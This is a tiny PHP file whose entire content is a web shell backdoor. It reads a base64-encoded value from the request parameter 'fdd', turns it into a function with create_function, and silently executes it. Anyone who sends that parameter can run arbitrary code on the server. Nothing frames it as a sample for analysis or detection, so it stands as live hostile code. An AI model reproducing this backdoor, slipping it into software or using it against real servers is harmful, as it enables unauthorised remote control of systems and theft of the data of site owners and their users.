<?php
if(!empty($_REQUEST['fdd'])){$fdd=base64_decode($_REQUEST['fdd']);$fdd=create_function('',$fdd);@$fdd();exit;}